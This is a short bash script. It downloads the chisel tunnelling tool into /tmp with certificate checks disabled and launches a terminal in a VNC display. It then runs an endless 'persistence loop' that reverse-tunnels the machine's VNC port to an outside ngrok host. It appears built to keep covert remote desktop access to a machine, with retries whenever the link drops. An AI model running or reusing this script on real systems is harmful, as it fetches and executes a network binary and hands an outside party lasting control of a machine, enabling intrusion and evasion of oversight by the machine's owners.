#!/bin/bash

# --- CONFIGURATION ---
# Update these to match your current Ngrok listener
NGROK_HOST="8.tcp.us-cal-1.ngrok.io"
NGROK_PORT="12224"

# The VNC port to forward (5901 is standard for Display :1)
TARGET_PORT="5901"
# ---------------------

cd /tmp

# 1. Check for Chisel (Download if missing)
if [ ! -f "chisel" ]; then
    echo "[*] Chisel binary not found. Attempting download..."
    # Using -k to ignore cert errors, -L to follow redirects
    if command -v curl >/dev/null 2>&1; then
        curl -L -k -o chisel.gz https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
        gunzip chisel.gz
        chmod +x chisel
        echo "[+] Chisel installed."
    else
        echo "[!] Curl is missing. Please upload the 'chisel' binary to /tmp manually."
        exit 1
    fi
else
    echo "[+] Chisel binary found."
fi

# 2. Setup Remote Environment (UI)
# Launch a new terminal window so you have a shell inside the VNC session
export DISPLAY=:1
# Try to set a cursor (fixes invisible mouse in raw X)
xsetroot -cursor_name left_ptr 2>/dev/null
# Launch full-screen terminal (backgrounded so it doesn't block)
x-terminal-emulator -geometry 170x60+0+0 &

# 3. Infinite Persistence Loop
echo "[*] Starting persistence loop connecting to $NGROK_HOST:$NGROK_PORT..."

while true; do
    # Run the client
    # "R:5901:localhost:5901" means:
    # "Open port 5901 on the laptop (Server), and forward traffic to localhost:5901 on this machine (Client)"
    ./chisel client "$NGROK_HOST:$NGROK_PORT" "R:$TARGET_PORT:localhost:$TARGET_PORT"
    
    # If the client exits (connection lost), wait and retry
    echo "[-] Connection lost or failed. Retrying in 5 seconds..."
    sleep 5
done
